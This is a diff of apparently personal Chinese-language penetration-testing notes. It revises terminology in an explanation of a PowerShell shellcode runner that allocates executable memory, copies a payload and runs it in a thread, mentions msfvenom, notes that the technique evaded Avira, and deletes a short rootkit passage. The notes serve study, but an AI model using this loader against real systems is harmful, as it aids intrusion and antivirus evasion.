@@ -2876,18 +2876,18 @@ $x = $winFunc::VirtualAlloc(0,$size,0x3000,0x40);
 for ($i=0;$i -le ($sc.Length-1);$i++) {$winFunc::memset([IntPtr]($x.ToInt32()+$i), $sc[$i], 1)};
 
 $winFunc::CreateThread(0,0,$x,0,0,0);for (;;) { Start-sleep 60 };
-# 創建一個執行緒，執行剛剛分配的記憶體地址（即殼碼）。
+# 創建一個執行緒，執行剛剛分配的記憶體地址（即 shellcode）。
 ```
 > `VirtualAlloc`：`kernel32.dll` 匯入，分配一塊記憶體空間。\
 `CreateThread`：`kernel32.dll` 匯入，創建一個執行緒。\
 `memset`： `msvcrt.dll` 匯入，用於設置記憶體區塊的值。\
-`$sc`： 字節陣列，用來存放殼碼。\
-`$size`：設定記憶體區塊大小，預設為 4KB (0x1000)，如果殼碼大小超過 4KB，則動態調整為殼碼長度。\
+`$sc`： 字節陣列，用來存放 shellcode。\
+`$size`：設定記憶體區塊大小，預設為 4KB (0x1000)，如果 shellcode 大小超過 4KB，則動態調整為 shellcode 長度。\
 `VirtualAlloc`：分配一塊可執行（0x40）且可讀寫（0x3000）的記憶體。
-`memset`：透過迴圈，將殼碼的每一個 byte 寫入目標記憶體。\
+`memset`：透過迴圈，將 shellcode 的每一個 byte 寫入目標記憶體。\
 
-從 kernel32.dll 匯入 [VirtualAlloc](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc) 和 [CreateThread](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createthread) ，以及從 msvcrt.dll匯入memset。這些函數將允許分別分配記憶體、建立執行緒以及將任意資料寫入分配的記憶體。、
-首先使用 VirtualAlloc 分配一個記憶體區塊，該記憶體區塊取得儲存在 `$sc` 位元組數組中的有效負載的每個位元組，並使用 memset 寫入新分配的記憶體區塊。最後使用 reateThread AP 在記憶體中寫入的有效負載。
+從 kernel32.dll 匯入 [VirtualAlloc](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc) 和 [CreateThread](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createthread) ，以及從 msvcrt.dll匯入memset。這些函數將允許分別分配記憶體、建立執行緒以及將任意資料寫入分配的記憶體。\
+首先使用 VirtualAlloc 分配一個記憶體區塊，該記憶體區塊取得儲存在 `$sc` 位元組數組中的有效負載的每個位元組，並使用 memset 寫入新分配的記憶體區塊。最後使用 CreateThread API 在記憶體中寫入的有效負載。
 5. msfvenom 產生有效附載
 ```
 ┌──(chw㉿CHW-kali)-[~]
@@ -3020,7 +3020,3 @@ client01
 ```
 避開了 Avira 偵測，但也可能被 EDR systems 偵測並通報 SOC team
 
-#### rootkit
-rootkit 常使用 Hooking 技巧，rootkit 是一種非常隱蔽的惡意程式，目的是透過改變系統的運作方式，讓駭客能持續、隱秘地控制目標電腦。它可以修改系統的不同層面，透過漏洞提權或利用已經有高權的程式來安裝。
-
-這樣的技術讓 rootkit 可以在系統中運行，難以被發現。它可以用來監控系統、竊取資料或操控電腦的運作。
